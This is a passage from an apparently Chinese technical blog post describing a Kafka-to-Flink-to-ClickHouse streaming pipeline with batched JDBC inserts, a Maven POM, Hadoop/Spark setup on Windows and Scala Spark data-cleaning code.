SqlMap.getSqlMap().keySet())&#123;</span><br><span class="line">            prepareStatementMap.put(simpleTableName, connection.prepareStatement(SqlMap.getSqlMap().get(simpleTableName)));</span><br><span class="line">        &#125;</span><br><span class="line">        count = <span class="number">0</span>;</span><br><span class="line">        lastPrepareStatement = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(String value, Context context)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">if</span> (value == <span class="literal">null</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">simpleTableName</span> <span class="operator">=</span>  JSONObject.parseObject(value).getString(<span class="string">&quot;eventType&quot;</span>);</span><br><span class="line">        <span class="type">PreparedStatement</span> <span class="variable">preparedStatement</span> <span class="operator">=</span> prepareStatementMap.get(simpleTableName);</span><br><span class="line">        <span class="keyword">if</span> (lastPrepareStatement != preparedStatement)&#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;change to sink table:&quot;</span> + simpleTableName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//当发现不是同一个preparedStatement时，说明开始写入一张新表，此时必须将上次的preparedStatement中残留的数据写入</span></span><br><span class="line">        <span class="keyword">if</span> (lastPrepareStatement != <span class="literal">null</span> &amp;&amp; lastPrepareStatement != preparedStatement)&#123;</span><br><span class="line">            lastPrepareStatement.executeBatch();</span><br><span class="line">            connection.commit();</span><br><span class="line">            lastPrepareStatement.clearBatch();</span><br><span class="line">        &#125;</span><br><span class="line">        lastPrepareStatement = preparedStatement;</span><br><span class="line"></span><br><span class="line">        clickhouseSqlHelper.setStatement(preparedStatement, value);</span><br><span class="line">        preparedStatement.addBatch();</span><br><span class="line">        count++;</span><br><span class="line">        <span class="comment">//计数每超过batchsize，就将批次中的数据写入</span></span><br><span class="line">        <span class="keyword">if</span> (count &gt; batchSize)&#123;</span><br><span class="line">            preparedStatement.executeBatch();</span><br><span class="line">            connection.commit();</span><br><span class="line">            preparedStatement.clearBatch();</span><br><span class="line">            count = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="built_in">super</span>.close();</span><br><span class="line">        <span class="keyword">if</span> (connection != <span class="literal">null</span>) &#123;</span><br><span class="line">            connection.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	由于一共有14种不同的数据类型和14张对应的要写入的表，必须准备14个不同的PreparedStatement，每个PreparedStatement提前设置对应的sql插入语句。</p>
<p>​	为了加快写入速率，使用按批处理的办法，每批次5000条，使用一个count计数当前批次中的数量，每当批次中数量超过5000，或者切换到一个新的PreparedStatement时，就将批次中的所有数据写入clickhouse，这样可以避免频繁连接数据库，能极大提高速率（在不设置batch时，平均速率只有60条&#x2F;s）。</p>
<p>​	在方法中，为了设置PreparedStatement，借助了一个自实现的ClickhouseSqlHelper，该类会读取接收到的数据，根据‘eventType’判断要写入哪张表中，然后根据具体的数据类型设置所有的字段（即statement.setXXX(i+1, value) ）核心代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setStatement</span><span class="params">(PreparedStatement statement, String json)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">      <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> JSON.parseObject(json);</span><br><span class="line">      <span class="type">String</span> <span class="variable">eventType</span> <span class="operator">=</span> jsonObject.getString(<span class="string">&quot;eventType&quot;</span>);</span><br><span class="line">      <span class="type">JSONObject</span> <span class="variable">eventBody</span> <span class="operator">=</span> jsonObject.getJSONObject(<span class="string">&quot;eventBody&quot;</span>);</span><br><span class="line"></span><br><span class="line">      Map&lt;String,String&gt; conDataTypeMap = <span class="built_in">this</span>.dataTypeMap.getConDataTypeMap(eventType);</span><br><span class="line">      List&lt;String&gt; columnNameList = <span class="built_in">this</span>.columnNameListMap.getColumnNameListMap().get(eventType);</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;columnNameList.size();i++)&#123;</span><br><span class="line">          <span class="type">String</span> <span class="variable">columnName</span> <span class="operator">=</span> columnNameList.get(i);</span><br><span class="line">          <span class="type">String</span> <span class="variable">columnType</span> <span class="operator">=</span> conDataTypeMap.get(columnName);</span><br><span class="line">          <span class="type">String</span> <span class="variable">columnValue</span> <span class="operator">=</span> eventBody.getString(columnName);</span><br><span class="line">          <span class="keyword">switch</span> (columnType)&#123;</span><br><span class="line">              <span class="keyword">case</span> <span class="string">&quot;String&quot;</span>:</span><br><span class="line">                  <span class="keyword">if</span> (columnValue == <span class="literal">null</span> || columnValue.equals(<span class="string">&quot;&quot;</span>))</span><br><span class="line">                      statement.setNull(i+<span class="number">1</span>,Types.VARCHAR);</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                      statement.setString(i+<span class="number">1</span>, columnValue);</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">              <span class="keyword">case</span> <span class="string">&quot;Int32&quot;</span>:</span><br><span class="line">                  <span class="keyword">if</span> (columnValue == <span class="literal">null</span> || columnValue.equals(<span class="string">&quot;&quot;</span>))</span><br><span class="line">                      statement.setNull(i+<span class="number">1</span>,Types.INTEGER);</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                      statement.setInt(i+<span class="number">1</span>, Integer.parseInt(columnValue));</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">              <span class="keyword">default</span>:<span class="keyword">if</span> (columnType.startsWith(<span class="string">&quot;Decimal&quot;</span>)) &#123;</span><br><span class="line">                  <span class="keyword">if</span> (columnValue == <span class="literal">null</span> || columnValue.equals(<span class="string">&quot;&quot;</span>))</span><br><span class="line">                      statement.setNull(i+<span class="number">1</span>, Types.DECIMAL);</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                      statement.setBigDecimal(i+<span class="number">1</span>,<span class="keyword">new</span> <span class="title class_">BigDecimal</span>(columnValue));</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>​	其他一些使用到的自实现的工具类有：</p>
<p>​		SqlMap，其作用为根据传入的表名返回对应的sql插入语句；</p>
<p>​		DataTypeMap，其作用为根据传入的表名和字段名，返回该字段的数据类型；</p>
<p>​		ColumnNameListMap，其作用为根据表明，按顺序返回一个包含该表所有字段名的列表（与sql插入语句的顺序对应）；</p>
<p>​	具体代码省略。</p>
<p>​	流式数据处理部分使用的全部依赖和插件如下，为了使用已搭建的flink，关于flink核心库的依赖需要添加<code>&lt;scope&gt;pro&lt;/scope&gt;</code>：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>sd<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>Streaming-Data-Processing<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-shade-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">phase</span>&gt;</span>package<span class="tag">&lt;/<span class="name">phase</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">goal</span>&gt;</span>shade<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">artifactSet</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">excludes</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">exclude</span>&gt;</span>com.google.code.findbugs:jsr305<span class="tag">&lt;/<span class="name">exclude</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">exclude</span>&gt;</span>org.slf4j:*<span class="tag">&lt;/<span class="name">exclude</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">exclude</span>&gt;</span>log4j:*<span class="tag">&lt;/<span class="name">exclude</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">excludes</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">artifactSet</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">filters</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">                                    <span class="comment">&lt;!-- Do not copy the signatures in the META-INF folder.</span></span><br><span class="line"><span class="comment">                                    Otherwise, this might cause SecurityExceptions when using the JAR. --&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">artifact</span>&gt;</span>*:*<span class="tag">&lt;/<span class="name">artifact</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">excludes</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">exclude</span>&gt;</span>META-INF/*.SF<span class="tag">&lt;/<span class="name">exclude</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">exclude</span>&gt;</span>META-INF/*.DSA<span class="tag">&lt;/<span class="name">exclude</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">exclude</span>&gt;</span>META-INF/*.RSA<span class="tag">&lt;/<span class="name">exclude</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">excludes</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">filters</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">transformers</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">transformer</span> <span class="attr">implementation</span>=<span class="string">&quot;org.apache.maven.plugins.shade.resource.ManifestResourceTransformer&quot;</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">mainClass</span>&gt;</span>sd.Main<span class="tag">&lt;/<span class="name">mainClass</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">transformer</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">transformers</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- lombok --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.18.20<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- SLF4J API --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.32<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- Logback实现库 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>ch.qos.logback<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>logback-classic<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- scala 2.11.12 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.scala-lang<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>scala-library<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.11.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- kafka 2.1.0--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.kafka<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>kafka-clients<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.kafka<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>kafka_2.11<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- flink 1.13.5--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.13.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-clients_2.11<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.13.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-table-api-java-bridge_2.11<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.13.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-streaming-java_2.11<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.13.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-connector-kafka_2.11<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.13.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- json --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.59<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- clickhouse --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>ru.yandex.clickhouse<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>clickhouse-jdbc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.3.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--        &lt;dependency&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--            &lt;groupId&gt;ru.yandex.clickhouse&lt;/groupId&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--            &lt;artifactId&gt;clickhouse-client&lt;/artifactId&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--            &lt;version&gt;0.3.0&lt;/version&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;/dependency&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h4 id="三-处理结果展示"><a href="#三-处理结果展示" class="headerlink" title="三 处理结果展示"></a>三 处理结果展示</h4><ol>
<li><p>在kafka全部生产完后，Flink过程速率为10000-80000条&#x2F;s不等，如果边生产边消费，实际速率受kafka生产者速率限制</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215215138436.png" alt="image-20241215215138436"></p>
</li>
<li><p>Clickhouse中数据展示：</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215215205324.png" alt="image-20241215215205324" style="zoom:67%;" /></li>
</ol>
<h3 id="静态数据部分"><a href="#静态数据部分" class="headerlink" title="静态数据部分"></a>静态数据部分</h3><h4 id="一-环境配置-1"><a href="#一-环境配置-1" class="headerlink" title="一 环境配置"></a>一 环境配置</h4><p>​	操作系统使用windows10，实时数据与静态数据使用的是两台设备，最后写入同一张表中。</p>
<h5 id="1-hadoop-2-7-4"><a href="#1-hadoop-2-7-4" class="headerlink" title="1. hadoop 2.7.4"></a>1. hadoop 2.7.4</h5><ol>
<li><p>下载hadoop2.7.4并配置环境变量</p>
</li>
<li><p>拷贝hadoop2.7.4\bin\hadoop.dll到目录C:\Windows\System32</p>
</li>
<li><p>配置文件</p>
</li>
<li><p>在etc\hadoop子目录下，对如下文件做出如下修改并创建相应的tmp、dataNode、nameNode的文件夹</p>
<ul>
<li><p>core-site.xml</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215215219268.png" alt="image-20241215215219268"></p>
</li>
<li><p>hdfs-site.xml</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215215232433.png" alt="image-20241215215232433"></p>
</li>
<li><p>yarn-site.xml</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215215241536.png" alt="image-20241215215241536"></p>
</li>
<li><p>复制mapred-site.xml.template，并重命名为mapred-site.xml，修改里面的内容                                             <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215215250422.png" alt="image-20241215215250422"></p>
</li>
</ul>
</li>
<li><p>格式化namenode：切换至$HADOOP_HOME&#x2F;bin目录下，使用CMD输入命令：hdfs namenode -format</p>
</li>
<li><p>启动Hadoop服务：切换至$HADOOP_HOME&#x2F;sbin目录下，执行start-all.cmd脚本，执行相应命令验证hadoop环境搭建成功</p>
</li>
</ol>
<h5 id="2-Scala-2-11-12"><a href="#2-Scala-2-11-12" class="headerlink" title="2. Scala 2.11.12"></a>2. Scala 2.11.12</h5><ol>
<li>下载并安装scala 2.11.12，配置环境变量</li>
<li>在IDEA中，Project Structure-&gt;Libraries-&gt;Scala SDK处添加对应的路径</li>
</ol>
<h5 id="3-Spark-2-3-3"><a href="#3-Spark-2-3-3" class="headerlink" title="3. Spark 2.3.3"></a>3. Spark 2.3.3</h5><ol>
<li>下载并安装spark-2.3.3-bin-hadoop2.7，配置环境变量</li>
</ol>
<h4 id="二-数据处理-1"><a href="#二-数据处理-1" class="headerlink" title="二 数据处理"></a>二 数据处理</h4><h5 id="1-读取数据并进行简单的数据清洗"><a href="#1-读取数据并进行简单的数据清洗" class="headerlink" title="1. 读取数据并进行简单的数据清洗"></a>1. 读取数据并进行简单的数据清洗</h5><p>​	具体代码如下：</p>
<ol>
<li><pre><code class="language-scala">var df = reader.option(&quot;dbtable&quot;, tblNameDst).load() 
val columnNames = df.columns.toList.map(name =&gt; name.substring(tblNameDst.length + 1)).toArray 
df = df.toDF(columnNames: _*) 
// 1.去掉重复数据行 
var uniDf = df.dropDuplicates() 
uniDf = uniDf.na.drop() 
// 2.去掉除uid全部为null的行 
val colNames = uniDf.columns.toList.toArray 
val colNamesWithoutUid = colNames.filter(colName =&gt; &#123; 
    !colName.equals(&quot;uid&quot;) 
&#125;) 
uniDf = uniDf.na.drop(&quot;all&quot;, colNamesWithoutUid)  
// 3.填充null值 
// &quot;&quot;&quot;&quot; -&gt; &quot;&quot; 
uniDf = uniDf.na.replace(colNames, Map(&quot;\&quot;\&quot;&quot; -&gt; &quot;&quot;)) 
val columnType: Map[String, String] = uniDf.dtypes.toMap 
var nonStringTypeCol: List[String] = List() 
var stringTypeCols: List[String] = List() 
for(columnName &lt;- uniDf.columns)&#123; 
    // 获得数据类型 
    val tmp = columnType(key = columnName) 
    if(!tmp.equals(&quot;StringType&quot;))&#123; 
        nonStringTypeCol = nonStringTypeCol :+ columnName 
    &#125; else &#123; 
        stringTypeCols = stringTypeCols :+ columnName 
    &#125; 
&#125; 
var resData = uniDf.na.fill(0, nonStringTypeCol) 
resData = resData.na.fill(&quot;&quot;, stringTypeCols) 
